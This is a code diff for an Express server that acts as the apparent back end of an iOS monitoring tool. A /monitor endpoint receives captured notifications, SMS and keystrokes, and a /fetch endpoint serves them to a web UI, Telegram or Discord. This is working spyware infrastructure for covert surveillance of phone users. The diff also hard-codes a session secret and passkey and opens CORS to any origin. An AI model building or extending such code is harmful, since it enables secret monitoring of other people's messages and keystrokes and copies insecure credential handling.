@@ -1,34 +1,23 @@
 const express = require('express');
-const session = require('express-session');
-const FileStore = require('session-file-store')(session);
-const cors = require('cors');
 const bodyParser = require('body-parser');
-
+const cors = require('cors');
+const session = require('express-session');
 const app = express();
 
-// Middleware
-app.use(cors({
-    origin: 'https://iosx.vercel.app', // Your frontend URL
-    credentials: true // Allow credentials to be sent
-}));
+app.use(cors());
+app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
+
 app.use(session({
-    store: new FileStore(), // Use FileStore for sessions
-    secret: '507402e9bca79ed5711bb5b3cec082b9c9c8846bfe2405dbc8e0da3ca445acc0', // Replace with your actual secret key
+    secret: '507402e9bca79ed5711bb5b3cec082b9c9c8846bfe2405dbc8e0da3ca445acc0', // Replace with a strong secret in production
     resave: false,
-    saveUninitialized: false,
-    cookie: { 
-        maxAge: 86400000, // Set cookie to expire in 1 day (24 hours)
-        httpOnly: true,
-        secure: true, // Set to true if using HTTPS in production
-        sameSite: 'none'
-    }
+    saveUninitialized: true,
+    cookie: { secure: true } // Set to true if using HTTPS
 }));
 
-// Your correct passkey
-const correctPasskey = '9ecd92e21bb795a6064f1c9c6cc4fb9b'; // Ensure this is set correctly
+// Replace with your actual passkey
+const correctPasskey = "9ecd92e21bb795a6064f1c9c6cc4fb9b";
 
-// Your activity tracking data and routes
 let activityData = {
     Notifications: '',
     SMS: '',
@@ -40,56 +29,61 @@ let activityData = {
     Keystrokes: ''
 };
 
-// Login endpoint
+// Login endpoint to authenticate the user
 app.post('/login', (req, res) => {
     const { passkey } = req.body;
-    console.log("Provided Passkey:", passkey);
-    console.log("Correct Passkey:", correctPasskey);
-
+    
+    // Check if passkey matches
     if (passkey === correctPasskey) {
-        req.session.authenticated = true;
-        console.log("User authenticated, session created.");
-        console.log("Session ID:", req.sessionID);
+        req.session.authenticated = true; // Set session auth flag
         res.status(200).json({ message: "Login successful" });
     } else {
-        console.log("Authentication failed.");
         res.status(401).json({ message: "Incorrect passkey" });
     }
 });
 
-// Authentication status check
+// Middleware to check if user is authenticated
+function isAuthenticated(req, res, next) {
+    if (req.session.authenticated) {
+        next();
+    } else {
+        res.status(401).json({ message: "Unauthorized" });
+    }
+}
+
+// Endpoint for iOS Monitoring Script to send data
+app.post('/monitor', isAuthenticated, (req, res) => {
+    const { activityType, data } = req.body;
+    if (activityType && activityData[activityType] !== undefined) {
+        activityData[activityType] = data;
+        res.sendStatus(200);
+    } else {
+        res.sendStatus(400);
+    }
+});
+
+// Endpoint for clients (Web UI, Telegram, Discord) to fetch data for a specific activity
+app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
+    const { activityType } = req.params;
+    res.json({ data: activityData[activityType] || "No data available" });
+});
+
+// Endpoint to check authentication status
 app.get('/auth-status', (req, res) => {
-    console.log("Checking auth status");
-    console.log("Session:", req.session); // Log the session content
-    res.json({ authenticated: req.session.authenticated || false });
+    if (req.session.authenticated) {
+        res.status(200).json({ authenticated: true });
+    } else {
+        res.status(401).json({ authenticated: false });
+    }
 });
 
 // Logout endpoint
 app.post('/logout', (req, res) => {
-    req.session.destroy(err => {
-        if (err) {
-            return res.status(500).json({ message: "Logout failed" });
-        }
-        res.clearCookie('connect.sid'); // Clear the session cookie
-        res.status(200).json({ message: "Logout successful" });
+    req.session.destroy(() => {
+        res.status(200).json({ message: "Logged out" });
     });
 });
 
-// Fetch activity data endpoint
-app.get('/fetch/:activityType', (req, res) => {
-    const activityType = req.params.activityType;
-
-    if (!activityData.hasOwnProperty(activityType)) {
-        return res.status(404).json({ message: "Activity type not found" });
-    }
-
-    // Example logic for populating activity data (this should be replaced with actual data fetching logic)
-    const data = activityData[activityType] || "No data available";
-    res.json({ data });
-});
-
-// Start the server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+app.listen(3000, () => {
+    console.log('Server running on http://localhost:3000');
 });
